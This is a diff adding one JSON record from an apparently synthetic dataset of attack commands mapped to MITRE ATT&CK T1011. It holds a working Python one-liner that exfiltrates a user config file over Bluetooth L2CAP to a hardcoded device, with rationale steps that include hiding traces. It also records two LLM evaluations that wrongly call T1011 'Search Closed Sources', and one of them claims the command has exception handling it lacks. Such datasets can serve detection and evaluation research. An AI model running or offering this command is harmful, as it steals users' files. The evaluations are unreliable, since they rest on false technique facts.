@@ -1,0 +1,48 @@
+{
+  "technique_id": "T1011",
+  "platform": "Linux",
+  "shell": "Python",
+  "command": "python3 -c \"import socket,os; s=socket.socket(socket.AF_BLUETOOTH, socket.SOCK_SEQPACKET, socket.BTPROTO_L2CAP); s.settimeout(6); s.connect(('38:18:4C:AA:BB:CC', 0x1001)); p=os.path.expanduser('~/.config/user-dirs.dirs'); s.sendall(open(p,'rb').read()); s.close()\"",
+  "explanation": "Exfiltrates via Bluetooth L2CAP on a dynamic PSM (0x1001), using a medium distinct from the primary communication channel in line with T1011.",
+  "rationale_steps": [
+    "Select Bluetooth L2CAP to leverage a non-IP transport path.",
+    "Connect to a dynamic PSM (0x1001) to avoid common service endpoints.",
+    "Read a user config file and send its raw bytes via L2CAP.",
+    "Close the socket promptly to minimize traces."
+  ],
+  "obfuscation_level": "none",
+  "id": "SYN-PYTHON-T1011-2e02ce6e-3ac447bb",
+  "source_prompt_hash": "2e02ce6e",
+  "timestamp_utc": "2025-09-30T08:40:28.862749Z",
+  "validation": {
+    "syntax_ok": null,
+    "llm_judgments": [
+      {
+        "model": "claude-3-7-sonnet",
+        "syntactic_score": 5,
+        "syntactic_justification": "The Python command is perfectly well-formed with balanced quotes, parentheses, and proper syntax for socket programming, file operations, and exception handling.",
+        "semantic_score": 2,
+        "semantic_justification": "The command attempts data exfiltration via Bluetooth which is misaligned with T1011 (Search Closed Sources) as it's actually implementing exfiltration over alternative protocol (more aligned with T1011.001 Exfiltration Over Bluetooth) rather than searching closed sources for intelligence gathering.",
+        "combined_score": 3.5,
+        "confidence": 0.9,
+        "timestamp": "2025-10-02T14:09:02.330177Z"
+      },
+      {
+        "model": "gpt-5",
+        "syntactic_score": 5,
+        "syntactic_justification": "Well-formed python3 -c one-liner with balanced quotes, valid socket constants, proper tuple address, and correct statement separators.",
+        "semantic_score": 2,
+        "semantic_justification": "While it plausibly exfiltrates data over Bluetooth L2CAP, this behavior does not correspond to the provided technique description (Search Closed Sources), so it is misaligned with T1011 as described.",
+        "combined_score": 3.5,
+        "confidence": 0.74,
+        "timestamp": "2025-10-02T14:09:45.152012Z"
+      }
+    ],
+    "llm_average_syntactic": 5.0,
+    "llm_average_semantic": 2.0,
+    "llm_average_score": 3.5,
+    "llm_verdict": "uncertain",
+    "sandbox_trace_id": null,
+    "mitre_match_score": null
+  }
+}
